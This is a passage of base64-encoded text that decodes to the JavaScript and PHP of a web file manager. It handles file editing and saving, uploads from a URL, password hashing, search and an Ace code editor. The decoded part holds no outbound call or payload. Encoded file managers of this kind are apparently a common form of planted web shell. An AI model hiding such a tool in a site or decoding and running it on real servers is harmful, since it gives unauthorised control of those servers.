gICAgICAgIHJldHVybiBuLm9wZW4oIlBPU1QiLCAiIiwgITApLCBuLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSwgbi5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIDQgPT0gbi5yZWFkeVN0YXRlICYmIDIwMCA9PSBuLnN0YXR1cyAmJiB0b2FzdChuLnJlc3BvbnNlVGV4dCkKICAgICAgICB9LCBuLnNlbmQoYSksICExCiAgICB9CiAgICAvLyBUb2FzdCBtZXNzYWdlCiAgICBmdW5jdGlvbiB0b2FzdCh0eHQpIHsgdmFyIHggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic25hY2tiYXIiKTt4LmlubmVySFRNTD10eHQ7eC5jbGFzc05hbWUgPSAic2hvdyI7c2V0VGltZW91dChmdW5jdGlvbigpeyB4LmNsYXNzTmFtZSA9IHguY2xhc3NOYW1lLnJlcGxhY2UoInNob3ciLCAiIik7IH0sIDMwMDApOyB9CiAgICAvL1NhdmUgZmlsZQogICAgZnVuY3Rpb24gZWRpdF9zYXZlKGUsIHQpIHsKICAgICAgICB2YXIgbiA9ICJhY2UiID09IHQgPyBlZGl0b3IuZ2V0U2Vzc2lvbigpLmdldFZhbHVlKCkgOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibm9ybWFsLWVkaXRvciIpLnZhbHVlOwogICAgICAgIGlmIChuKSB7CiAgICAgICAgICAgIGlmKHRydWUpewogICAgICAgICAgICAgICAgdmFyIGRhdGEgPSB7YWpheDogdHJ1ZSwgY29udGVudDogbiwgdHlwZTogJ3NhdmUnfTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgdXJsOiB3aW5kb3cubG9jYXRpb24sCiAgICAgICAgICAgICAgICAgICAgLy8gVGhlIGtleSBuZWVkcyB0byBtYXRjaCB5b3VyIG1ldGhvZCdzIGlucHV0IHBhcmFtZXRlciAoY2FzZS1zZW5zaXRpdmUpLgogICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KGRhdGEpLAogICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAibXVsdGlwYXJ0L2Zvcm0tZGF0YS1lbmNvZGVkOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAvL2RhdGFUeXBlOiAianNvbiIsCiAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24obWVzKXt0b2FzdCgiU2F2ZWQgU3VjY2Vzc2Z1bGx5Iik7IHdpbmRvdy5vbmJlZm9yZXVubG9hZCA9IGZ1bmN0aW9uKCkge3JldHVybn19LAogICAgICAgICAgICAgICAgICAgIGZhaWx1cmU6IGZ1bmN0aW9uKG1lcykge3RvYXN0KCJFcnJvcjogdHJ5IGFnYWluIik7fSwKICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24obWVzKSB7dG9hc3QoYDxwIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOnJlZCI+JHttZXMucmVzcG9uc2VUZXh0fTwvcD5gKTt9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKTsKICAgICAgICAgICAgICAgIGEuc2V0QXR0cmlidXRlKCJtZXRob2QiLCAiUE9TVCIpLCBhLnNldEF0dHJpYnV0ZSgiYWN0aW9uIiwgIiIpOwogICAgICAgICAgICAgICAgdmFyIG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ0ZXh0YXJlYSIpOwogICAgICAgICAgICAgICAgby5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dGFyZWEiKSwgby5zZXRBdHRyaWJ1dGUoIm5hbWUiLCAic2F2ZWRhdGEiKTsKICAgICAgICAgICAgICAgIHZhciBjID0gZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUobik7CiAgICAgICAgICAgICAgICBvLmFwcGVuZENoaWxkKGMpLCBhLmFwcGVuZENoaWxkKG8pLCBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpLCBhLnN1Ym1pdCgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAvL0NoZWNrIGxhdGVzdCB2ZXJzaW9uCiAgICBmdW5jdGlvbiBsYXRlc3RfcmVsZWFzZV9pbmZvKHYpIHsKICAgICAgICBpZighIXdpbmRvdy5jb25maWcpe3ZhciB0cGxPYmo9e2lkOjEwMjQsdGl0bGU6IkNoZWNrIFZlcnNpb24iLGFjdGlvbjpmYWxzZX0sdHBsPSQoIiNqcy10cGwtbW9kYWwiKS5odG1sKCk7CiAgICAgICAgaWYod2luZG93LmNvbmZpZy52ZXJzaW9uIT12KXt0cGxPYmouY29udGVudD13aW5kb3cuY29uZmlnLm5ld1VwZGF0ZTt9ZWxzZXt0cGxPYmouY29udGVudD13aW5kb3cuY29uZmlnLm5vVXBkYXRlO30KICAgICAgICAkKCcjd3JhcHBlcicpLmFwcGVuZCh0ZW1wbGF0ZSh0cGwsdHBsT2JqKSk7JCgiI2pzLU1vZGFsQ2VudGVyLTEwMjQiKS5tb2RhbCgnc2hvdycpO31lbHNle2ZtX2dldF9jb25maWcoKTt9CiAgICB9CiAgICBmdW5jdGlvbiBzaG93X25ld19wd2QoKSB7ICQoIi5qcy1uZXctcHdkIikudG9nZ2xlQ2xhc3MoJ2hpZGRlbicpOyB9CiAgICAvL1NhdmUgU2V0dGluZ3MKICAgIGZ1bmN0aW9uIHNhdmVfc2V0dGluZ3MoJHRoaXMpIHsKICAgICAgICBsZXQgZm9ybSA9ICQoJHRoaXMpOwogICAgICAgICQuYWpheCh7CiAgICAgICAgICAgIHR5cGU6IGZvcm0uYXR0cignbWV0aG9kJyksIHVybDogZm9ybS5hdHRyKCdhY3Rpb24nKSwgZGF0YTogZm9ybS5zZXJpYWxpemUoKSsiJmFqYXg9Iit0cnVlLAogICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbiAoZGF0YSkge2lmKGRhdGEpIHsgd2luZG93LmxvY2F0aW9uLnJlbG9hZCgpO319CiAgICAgICAgfSk7IHJldHVybiBmYWxzZTsKICAgIH0KICAgIC8vQ3JlYXRlIG5ldyBwYXNzd29yZCBoYXNoCiAgICBmdW5jdGlvbiBuZXdfcGFzc3dvcmRfaGFzaCgkdGhpcykgewogICAgICAgIGxldCBmb3JtID0gJCgkdGhpcyksICRwd2QgPSAkKCIjanMtcHdkLXJlc3VsdCIpOyAkcHdkLnZhbCgnJyk7CiAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgdHlwZTogZm9ybS5hdHRyKCdtZXRob2QnKSwgdXJsOiBmb3JtLmF0dHIoJ2FjdGlvbicpLCBkYXRhOiBmb3JtLnNlcmlhbGl6ZSgpKyImYWpheD0iK3RydWUsCiAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uIChkYXRhKSB7IGlmKGRhdGEpIHsgJHB3ZC52YWwoZGF0YSk7IH0gfQogICAgICAgIH0pOyByZXR1cm4gZmFsc2U7CiAgICB9CiAgICAvL1VwbG9hZCBmaWxlcyB1c2luZyBVUkwgQHBhcmFtIHtPYmplY3R9CiAgICBmdW5jdGlvbiB1cGxvYWRfZnJvbV91cmwoJHRoaXMpIHsKICAgICAgICBsZXQgZm9ybSA9ICQoJHRoaXMpLCByZXN1bHRXcmFwcGVyID0gJCgiZGl2I2pzLXVybC11cGxvYWRfX2xpc3QiKTsKICAgICAgICAkLmFqYXgoewogICAgICAgICAgICB0eXBlOiBmb3JtLmF0dHIoJ21ldGhvZCcpLCB1cmw6IGZvcm0uYXR0cignYWN0aW9uJyksIGRhdGE6IGZvcm0uc2VyaWFsaXplKCkrIiZhamF4PSIrdHJ1ZSwKICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oKSB7IGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikuYXR0cigiZGlzYWJsZWQiLCJkaXNhYmxlZCIpOyBmb3JtLmZpbmQoImJ1dHRvbiIpLmhpZGUoKTsgZm9ybS5maW5kKCIubGRzLWZhY2Vib29rIikuYWRkQ2xhc3MoJ3Nob3ctbWUnKTsgfSwKICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICAgICAgICAgIGlmKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICBpZihkYXRhLmRvbmUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0V3JhcHBlci5hcHBlbmQoJzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3Mgcm93Ij5VcGxvYWRlZCBTdWNjZXNzZnVsOiAnK2RhdGEuZG9uZS5uYW1lKyc8L2Rpdj4nKTsgZm9ybS5maW5kKCJpbnB1dFtuYW1lPXVwbG9hZHVybF0iKS52YWwoJycpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZihkYXRhWydmYWlsJ10pIHsgcmVzdWx0V3JhcHBlci5hcHBlbmQoJzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWRhbmdlciByb3ciPkVycm9yOiAnK2RhdGEuZmFpbC5tZXNzYWdlKyc8L2Rpdj4nKTsgfQogICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikucmVtb3ZlQXR0cigiZGlzYWJsZWQiKTtmb3JtLmZpbmQoImJ1dHRvbiIpLnNob3coKTtmb3JtLmZpbmQoIi5sZHMtZmFjZWJvb2siKS5yZW1vdmVDbGFzcygnc2hvdy1tZScpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oeGhyKSB7CiAgICAgICAgICAgICAgICBmb3JtLmZpbmQoImlucHV0W25hbWU9dXBsb2FkdXJsXSIpLnJlbW92ZUF0dHIoImRpc2FibGVkIik7Zm9ybS5maW5kKCJidXR0b24iKS5zaG93KCk7Zm9ybS5maW5kKCIubGRzLWZhY2Vib29rIikucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTtjb25zb2xlLmVycm9yKHhocik7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLy9TZWFyY2ggdGVtcGxhdGUKICAgIGZ1bmN0aW9uIHNlYXJjaF90ZW1wbGF0ZShkYXRhKSB7CiAgICAgICAgdmFyIHJlc3BvbnNlID0gIiI7CiAgICAgICAgJC5lYWNoKGRhdGEsIGZ1bmN0aW9uIChrZXksIHZhbCkgewogICAgICAgICAgICByZXNwb25zZSArPSBgPGxpPjxhIGhyZWY9Ij9wPSR7dmFsLnBhdGh9JnZpZXc9JHt2YWwubmFtZX0iPiR7dmFsLnBhdGh9LyR7dmFsLm5hbWV9PC9hPjwvbGk+YDsKICAgICAgICB9KTsKICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICB9CiAgICAvL3NlYXJjaAogICAgZnVuY3Rpb24gZm1fc2VhcmNoKCkgewogICAgICAgIHZhciBzZWFyY2hUeHQgPSAkKCJpbnB1dCNhZHZhbmNlZC1zZWFyY2giKS52YWwoKSwgc2VhcmNoV3JhcHBlciA9ICQoInVsI3NlYXJjaC13cmFwcGVyIiksIHBhdGggPSAkKCIjanMtc2VhcmNoLW1vZGFsIikuYXR0cigiaHJlZiIpLCBfaHRtbCA9ICIiLCAkbG9hZGVyID0gJCgiZGl2Lmxkcy1mYWNlYm9vayIpOwogICAgICAgIGlmKCEhc2VhcmNoVHh0ICYmIHNlYXJjaFR4dC5sZW5ndGggPiAyICYmIHBhdGgpIHsKICAgICAgICAgICAgdmFyIGRhdGEgPSB7YWpheDogdHJ1ZSwgY29udGVudDogc2VhcmNoVHh0LCBwYXRoOnBhdGgsIHR5cGU6ICdzZWFyY2gnfTsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgIHVybDogd2luZG93LmxvY2F0aW9uLAogICAgICAgICAgICAgICAgZGF0YTogZGF0YSwKICAgICAgICAgICAgICAgIGJlZm9yZVNlbmQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIHNlYXJjaFdyYXBwZXIuaHRtbCgnJyk7CiAgICAgICAgICAgICAgICAgICAgJGxvYWRlci5hZGRDbGFzcygnc2hvdy1tZScpOwogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpewogICAgICAgICAgICAgICAgICAgICRsb2FkZXIucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTsKICAgICAgICAgICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICBpZihkYXRhICYmIGRhdGEubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIF9odG1sID0gc2VhcmNoX3RlbXBsYXRlKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICBzZWFyY2hXcmFwcGVyLmh0bWwoX2h0bWwpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7IHNlYXJjaFdyYXBwZXIuaHRtbCgnPHAgY2xhc3M9Im0tMiI+Tm8gcmVzdWx0IGZvdW5kITxwPicpOyB9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKHhocikgeyAkbG9hZGVyLnJlbW92ZUNsYXNzKCdzaG93LW1lJyk7IHNlYXJjaFdyYXBwZXIuaHRtbCgnPHAgY2xhc3M9Im0tMiI+RVJST1I6IFRyeSBhZ2FpbiBsYXRlciE8L3A+Jyk7IH0sCiAgICAgICAgICAgICAgICBmYWlsdXJlOiBmdW5jdGlvbihtZXMpIHsgJGxvYWRlci5yZW1vdmVDbGFzcygnc2hvdy1tZScpOyBzZWFyY2hXcmFwcGVyLmh0bWwoJzxwIGNsYXNzPSJtLTIiPkVSUk9SOiBUcnkgYWdhaW4gbGF0ZXIhPC9wPicpO30KICAgICAgICAgICAgfSk7CiAgICAgICAgfSBlbHNlIHsgc2VhcmNoV3JhcHBlci5odG1sKCJPT1BTOiBtaW5pbXVtIDMgY2hhcmFjdGVycyByZXF1aXJlZCEiKTsgfQogICAgfQoKICAgIC8vb24gbW91c2UgaG92ZXIgaW1hZ2UgcHJldmlldwogICAgIWZ1bmN0aW9uKHMpe3MucHJldmlld0ltYWdlPWZ1bmN0aW9uKGUpe3ZhciBvPXMoZG9jdW1lbnQpLHQ9Ii5wcmV2aWV3SW1hZ2UiLGE9cy5leHRlbmQoe3hPZmZzZXQ6MjAseU9mZnNldDotMjAsZmFkZUluOiJmYXN0Iixjc3M6e3BhZGRpbmc6IjVweCIsYm9yZGVyOiIxcHggc29saWQgI2NjY2NjYyIsImJhY2tncm91bmQtY29sb3IiOiIjZmZmIn0sZXZlbnRTZWxlY3RvcjoiW2RhdGEtcHJldmlldy1pbWFnZV0iLGRhdGFLZXk6InByZXZpZXdJbWFnZSIsb3ZlcmxheUlkOiJwcmV2aWV3LWltYWdlLXBsdWdpbi1vdmVybGF5In0sZSk7cmV0dXJuIG8ub2ZmKHQpLG8ub24oIm1vdXNlb3ZlciIrdCxhLmV2ZW50U2VsZWN0b3IsZnVuY3Rpb24oZSl7cygicCMiK2Eub3ZlcmxheUlkKS5yZW1vdmUoKTt2YXIgbz1zKCI8cD4iKS5hdHRyKCJpZCIsYS5vdmVybGF5SWQpLmNzcygicG9zaXRpb24iLCJhYnNvbHV0ZSIpLmNzcygiZGlzcGxheSIsIm5vbmUiKS5hcHBlbmQocygnPGltZyBjbGFzcz0iYy1wcmV2aWV3LWltZyI+JykuYXR0cigic3JjIixzKHRoaXMpLmRhdGEoYS5kYXRhS2V5KSkpO2EuY3NzJiZvLmNzcyhhLmNzcykscygiYm9keSIpLmFwcGVuZChvKSxvLmNzcygidG9wIixlLnBhZ2VZK2EueU9mZnNldCsicHgiKS5jc3MoImxlZnQiLGUucGFnZVgrYS54T2Zmc2V0KyJweCIpLmZhZGVJbihhLmZhZGVJbil9KSxvLm9uKCJtb3VzZW91dCIrdCxhLmV2ZW50U2VsZWN0b3IsZnVuY3Rpb24oKXtzKCIjIithLm92ZXJsYXlJZCkucmVtb3ZlKCl9KSxvLm9uKCJtb3VzZW1vdmUiK3QsYS5ldmVudFNlbGVjdG9yLGZ1bmN0aW9uKGUpe3MoIiMiK2Eub3ZlcmxheUlkKS5jc3MoInRvcCIsZS5wYWdlWSthLnlPZmZzZXQrInB4IikuY3NzKCJsZWZ0IixlLnBhZ2VYK2EueE9mZnNldCsicHgiKX0pLHRoaXN9LHMucHJldmlld0ltYWdlKCl9KGpRdWVyeSk7CgoKICAgIC8vIERvbSBSZWFkeSBFdmVudAogICAgJChkb2N1bWVudCkucmVhZHkoIGZ1bmN0aW9uICgpIHsKICAgICAgICAvL2xvYWQgY29uZmlnCiAgICAgICAgZm1fZ2V0X2NvbmZpZygpOwogICAgICAgIC8vZGF0YVRhYmxlIGluaXQKICAgICAgICB2YXIgJHRhYmxlID0gJCgnI21haW4tdGFibGUnKSwKICAgICAgICAgICAgdGFibGVMbmcgPSAkdGFibGUuZmluZCgndGgnKS5sZW5ndGgsCiAgICAgICAgICAgIF90YXJnZXRzID0gKHRhYmxlTG5nICYmIHRhYmxlTG5nID09IDcgKSA/IFswLCA0LDUsNl0gOiB0YWJsZUxuZyA9PSA1ID8gWzAsNF0gOiBbM10sCiAgICAgICAgICAgIG1haW5UYWJsZSA9ICQoJyNtYWluLXRhYmxlJykuRGF0YVRhYmxlKHsicGFnaW5nIjogICBmYWxzZSwgImluZm8iOiAgICAgZmFsc2UsICJjb2x1bW5EZWZzIjogW3sidGFyZ2V0cyI6IF90YXJnZXRzLCAib3JkZXJhYmxlIjogZmFsc2V9XQogICAgICAgIH0pOwogICAgICAgIC8vc2VhcmNoCiAgICAgICAgJCgnI3NlYXJjaC1hZGRvbicpLm9uKCAna2V5dXAnLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIG1haW5UYWJsZS5zZWFyY2goIHRoaXMudmFsdWUgKS5kcmF3KCk7CiAgICAgICAgfSk7CiAgICAgICAgJCgiaW5wdXQjYWR2YW5jZWQtc2VhcmNoIikub24oJ2tleXVwJywgZnVuY3Rpb24gKGUpIHsKICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PT0gMTMpIHsgZm1fc2VhcmNoKCk7IH0KICAgICAgICB9KTsKICAgICAgICAkKCcjc2VhcmNoLWFkZG9uMycpLm9uKCAnY2xpY2snLCBmdW5jdGlvbiAoKSB7IGZtX3NlYXJjaCgpOyB9KTsKICAgICAgICAvL3VwbG9hZCBuYXYgdGFicwogICAgICAgICQoIi5mbS11cGxvYWQtd3JhcHBlciAuY2FyZC1oZWFkZXItdGFicyIpLm9uKCJjbGljayIsICdhJywgZnVuY3Rpb24oZSl7CiAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTtsZXQgdGFyZ2V0PSQodGhpcykuZGF0YSgndGFyZ2V0Jyk7CiAgICAgICAgICAgICQoIi5mbS11cGxvYWQtd3JhcHBlciAuY2FyZC1oZWFkZXItdGFicyBhIikucmVtb3ZlQ2xhc3MoJ2FjdGl2ZScpOyQodGhpcykuYWRkQ2xhc3MoJ2FjdGl2ZScpOwogICAgICAgICAgICAkKCIuZm0tdXBsb2FkLXdyYXBwZXIgLmNhcmQtdGFicy1jb250YWluZXIiKS5hZGRDbGFzcygnaGlkZGVuJyk7JCh0YXJnZXQpLnJlbW92ZUNsYXNzKCdoaWRkZW4nKTsKICAgICAgICB9KTsKICAgIH0pOwo8L3NjcmlwdD4KPD9waHAgaWYgKGlzc2V0KCRfR0VUWydlZGl0J10pICYmIGlzc2V0KCRfR0VUWydlbnYnXSkgJiYgRk1fRURJVF9GSUxFKTogCiAgICAgICAgJGV4dCA9ICJqYXZhc2NyaXB0IjsKICAgICAgICAkZXh0ID0gcGF0aGluZm8oJF9HRVRbImVkaXQiXSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICAgICA/PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2FjZS8xLjQuMS9hY2UuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdD4KICAgICAgICB2YXIgZWRpdG9yID0gYWNlLmVkaXQoImVkaXRvciIpOwogICAgICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZSgge3BhdGg6ImFjZS9tb2RlLzw/cGhwIGVjaG8gJGV4dDsgPz4iLCBpbmxpbmU6dHJ1ZX0gKTsKICAgICAgICAvL2VkaXRvci5zZXRUaGVtZSgiYWNlL3RoZW1lL3R3aWxpZ2h0Iik7IC8vRGFyayBUaGVtZQogICAgICAgIGZ1bmN0aW9uIGFjZV9jb21tZW5kIChjbWQpIHsgZWRpdG9yLmNvbW1hbmRzLmV4ZWMoY21kLCBlZGl0b3IpOyB9CiAgICAgICAgZWRpdG9yLmNvbW1hbmRzLmFkZENvbW1hbmRzKFt7CiAgICAgICAgICAgIG5hbWU6ICdzYXZlJywgYmluZEtleToge3dpbjogJ0N0cmwtUycsICBtYWM6ICdDb21tYW5kLVMnfSwKICAgICAgICAgICAgZXhlYzogZnVuY3Rpb24oZWRpdG9yKSB7IGVkaXRfc2F2ZSh0aGlzLCAnYWNlJyk7IH0KICAgICAgICB9XSk7CiAgICAgICAgZnVuY3Rpb24gcmVuZGVyVGhlbWVNb2RlKCkgewogICAgICAgICAgICB2YXIgJG1vZGVFbCA9ICQoInNlbGVjdCNqcy1hY2UtbW9kZSIpLCAkdGhlbWVFbCA9ICQoInNlbGVjdCNqcy1hY2UtdGhlbWUiKSwgJGZvbnRTaXplRWwgPSAkKCJzZWxlY3QjanMtYWNlLWZvbnRTaXplIiksIG9wdGlvbk5vZGUgPSBmdW5jdGlvbih0eXBlLCBhcnIpeyB2YXIgJE9wdGlvbiA9ICIiOyAkLmVhY2goYXJyLCBmdW5jdGlvbihpLCB2YWwpIHsgJE9wdGlvbiArPSAiPG9wdGlvbiB2YWx1ZT0nIit0eXBlK2krIic+IiArIHZhbCArICI8L29wdGlvbj4iOyB9KTsgcmV0dXJuICRPcHRpb247IH0sCiAgICAgICAgICAgICAgICBfZGF0YSA9IHsiYWNlVGhlbWUiOnsiYnJpZ2h0Ijp7ImNocm9tZSI6IkNocm9tZSIsImNsb3VkcyI6IkNsb3VkcyIsImNyaW1zb25fZWRpdG9yIjoiQ3JpbXNvbiBFZGl0b3IiLCJkYXduIjoiRGF3biIsImRyZWFtd2VhdmVyIjoiRHJlYW13ZWF2ZXIiLCJlY2xpcHNlIjoiRWNsaXBzZSIsImdpdGh1YiI6IkdpdEh1YiIsImlwbGFzdGljIjoiSVBsYXN0aWMiLCJzb2xhcml6ZWRfbGlnaHQiOiJTb2xhcml6ZWQgTGlnaHQiLCJ0ZXh0bWF0ZSI6IlRleHRNYXRlIiwidG9tb3Jyb3ciOiJUb21vcnJvdyIsInhjb2RlIjoiWENvZGUiLCJrdXJvaXIiOiJLdXJvaXIiLCJrYXR6ZW5taWxjaCI6IkthdHplbk1pbGNoIiwic3Fsc2VydmVyIjoiU1FMIFNlcnZlciJ9LCJkYXJrIjp7ImFtYmlhbmNlIjoiQW1iaWFuY2UiLCJjaGFvcyI6IkNoYW9zIiwiY2xvdWRzX21pZG5pZ2h0IjoiQ2xvdWRzIE1pZG5pZ2h0IiwiZHJhY3VsYSI6IkRyYWN1bGEiLCJjb2JhbHQiOiJDb2JhbHQiLCJncnV2Ym94IjoiR3J1dmJveCIsImdvYiI6IkdyZWVuIG9uIEJsYWNrIiwiaWRsZV9maW5nZXJzIjoiaWRsZSBGaW5nZXJzIiwia3JfdGhlbWUiOiJrclRoZW1lIiwibWVyYml2b3JlIjoiTWVyYml2b3JlIiwibWVyYml2b3JlX3NvZnQiOiJNZXJiaXZvcmUgU29mdCIsIm1vbm9faW5kdXN0cmlhbCI6Ik1vbm8gSW5kdXN0cmlhbCIsIm1vbm9rYWkiOiJNb25va2FpIiwicGFzdGVsX29uX2RhcmsiOiJQYXN0ZWwgb24gZGFyayIsInNvbGFyaXplZF9kYXJrIjoiU29sYXJpemVkIERhcmsiLCJ0ZXJtaW5hbCI6IlRlcm1pbmFsIiwidG9tb3Jyb3dfbmlnaHQiOiJUb21vcnJvdyBOaWdodCIsInRvbW9ycm93X25pZ2h0X2JsdWUiOiJUb21vcnJvdyBOaWdodCBCbHVlIiwidG9tb3Jyb3dfbmlnaHRfYnJpZ2h0IjoiVG9tb3Jyb3cgTmlnaHQgQnJpZ2h0IiwidG9tb3Jyb3dfbmlnaHRfZWlnaHRpZXMiOiJUb21vcnJvdyBOaWdodCA4MHMiLCJ0d2lsaWdodCI6IlR3aWxpZ2h0IiwidmlicmFudF9pbmsiOiJWaWJyYW50IEluayJ9fSwiYWNlTW9kZSI6eyJqYXZhc2NyaXB0IjoiSmF2YVNjcmlwdCIsImFiYXAiOiJBQkFQIiwiYWJjIjoiQUJDIiwiYWN0aW9uc2NyaXB0IjoiQWN0aW9uU2NyaXB0IiwiYWRhIjoiQURBIiwiYXBhY2hlX2NvbmYiOiJBcGFjaGUgQ29uZiIsImFzY2lpZG9jIjoiQXNjaWlEb2MiLCJhc2wiOiJBU0wiLCJhc3NlbWJseV94ODYiOiJBc3NlbWJseSB4ODYiLCJhdXRvaG90a2V5IjoiQXV0b0hvdEtleSIsImFwZXgiOiJBcGV4IiwiYmF0Y2hmaWxlIjoiQmF0Y2hGaWxlIiwiYnJvIjoiQnJvIiwiY19jcHAiOiJDIGFuZCBDKysiLCJjOXNlYXJjaCI6IkM5U2VhcmNoIiwiY2lycnUiOiJDaXJydSIsImNsb2p1cmUiOiJDbG9qdXJlIiwiY29ib2wiOiJDb2JvbCIsImNvZmZlZSI6IkNvZmZlZVNjcmlwdCIsImNvbGRmdXNpb24iOiJDb2xkRnVzaW9uIiwiY3NoYXJwIjoiQyMiLCJjc291bmRfZG9jdW1lbnQiOiJDc291bmQgRG9jdW1lbnQiLCJjc291bmRfb3JjaGVzdHJhIjoiQ3NvdW5kIiwiY3NvdW5kX3Njb3JlIjoiQ3NvdW5kIFNjb3JlIiwiY3NzIjoiQ1NTIiwiY3VybHkiOiJDdXJseSIsImQiOiJEIiwiZGFydCI6IkRhcnQiLCJkaWZmIjoiRGlmZiIsImRvY2tlcmZpbGUiOiJEb2NrZXJmaWxlIiwiZG90IjoiRG90IiwiZHJvb2xzIjoiRHJvb2xzIiwiZWRpZmFjdCI6IkVkaWZhY3QiLCJlaWZmZWwiOiJFaWZmZWwiLCJlanMiOiJFSlMiLCJlbGl4aXIiOiJFbGl4aXIiLCJlbG0iOiJFbG0iLCJlcmxhbmciOiJFcmxhbmciLCJmb3J0aCI6IkZvcnRoIiwiZm9ydHJhbiI6IkZvcnRyYW4iLCJmc2hhcnAiOiJGU2hhcnAiLCJmc2wiOiJGU0wiLCJmdGwiOiJGcmVlTWFya2VyIiwiZ2NvZGUiOiJHY29kZSIsImdoZXJraW4iOiJHaGVya2luIiwiZ2l0aWdub3JlIjoiR2l0aWdub3JlIiwiZ2xzbCI6Ikdsc2wiLCJnb2JzdG9uZXMiOiJHb2JzdG9uZXMiLCJnb2xhbmciOiJHbyIsImdyYXBocWxzY2hlbWEiOiJHcmFwaFFMU2NoZW1hIiwiZ3Jvb3Z5IjoiR3Jvb3Z5IiwiaGFtbCI6IkhBTUwiLCJoYW5kbGViYXJzIjoiSGFuZGxlYmFycyIsImhhc2tlbGwiOiJIYXNrZWxsIiwiaGFza2VsbF9jYWJhbCI6Ikhhc2tlbGwgQ2FiYWwiLCJoYXhlIjoiaGFYZSIsImhqc29uIjoiSGpzb24iLCJodG1sIjoiSFRNTCIsImh0bWxfZWxpeGlyIjoiSFRNTCAoRWxpeGlyKSIsImh0bWxfcnVieSI6IkhUTUwgKFJ1YnkpIiwiaW5pIjoiSU5JIiwiaW8iOiJJbyIsImphY2siOiJKYWNrIiwiamFkZSI6IkphZGUiLCJqYXZhIjoiSmF2YSIsImpzb24iOiJKU09OIiwianNvbmlxIjoiSlNPTmlxIiwianNwIjoiSlNQIiwianNzbSI6IkpTU00iLCJqc3giOiJKU1giLCJqdWxpYSI6Ikp1bGlhIiwia290bGluIjoiS290bGluIiwibGF0ZXgiOiJMYVRlWCIsImxlc3MiOiJMRVNTIiwibGlxdWlkIjoiTGlxdWlkIiwibGlzcCI6Ikxpc3AiLCJsaXZlc2NyaXB0IjoiTGl2ZVNjcmlwdCIsImxvZ2lxbCI6IkxvZ2lRTCIsImxzbCI6IkxTTCIsImx1YSI6Ikx1YSIsImx1YXBhZ2UiOiJMdWFQYWdlIiwibHVjZW5lIjoiTHVjZW5lIiwibWFrZWZpbGUiOiJNYWtlZmlsZSIsIm1hcmtkb3duIjoiTWFya2Rvd24iLCJtYXNrIjoiTWFzayIsIm1hdGxhYiI6Ik1BVExBQiIsIm1hemUiOiJNYXpl